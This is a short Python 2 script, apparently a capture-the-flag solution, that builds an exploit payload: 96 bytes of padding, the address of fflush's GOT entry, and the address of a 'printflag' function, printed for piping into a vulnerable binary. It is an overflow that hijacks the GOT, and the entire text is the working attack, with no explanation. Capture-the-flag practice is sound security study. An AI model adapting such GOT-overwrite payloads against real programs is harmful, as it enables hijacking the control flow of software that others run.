got_fflush = '\x04\xa0\x04\x08'
printflag = 0x80485e3
buf = '0' * 96 + got_fflush + str(printflag)
print buf
